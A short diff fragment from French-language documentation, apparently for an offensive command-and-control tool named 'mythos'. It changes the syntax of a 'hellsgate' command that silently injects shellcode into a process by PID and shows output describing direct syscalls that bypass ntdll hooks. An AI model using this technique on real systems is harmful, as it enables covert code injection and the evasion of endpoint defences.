@@ -318,7 +318,7 @@ mythos [ID] > proclist
 
 3. **Exécuter l'injection silencieuse**
 ```text
-mythos [ID] > hellsgate 1337:<VOTRE_BASE64_ICI>
+mythos [ID] > hellsgate <PID> <CHEMIN_SHELLCODE>
 [*] [Hell's Gate] Shellcode injecté avec succès dans PID 1337
     Technique: Direct syscalls (bypass hooks ntdll)
     SSN NtAllocateVirtualMemory: 0x0018
